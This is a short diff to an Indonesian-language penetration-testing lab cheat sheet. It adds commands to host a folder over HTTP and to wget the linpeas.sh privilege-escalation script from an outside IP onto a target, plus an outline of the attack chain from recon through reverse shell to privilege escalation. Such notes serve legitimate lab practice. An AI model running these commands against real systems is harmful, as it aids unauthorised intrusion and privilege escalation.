@@ -1,5 +1,15 @@
 # Cheat Sheet — Lab Reference
 
+Ingat perintah berikut:
+```bash
+cd Downloads
+python -m http.server 899
+
+cd /tmp
+wget http://69.69.69.69:899/linpeas.sh
+``` 
+
+Contekan dari sebelah:
 Referensi teknik & payload:
 recon → foothold → reverse shell → enumerasi → privilege escalation → proof.
 
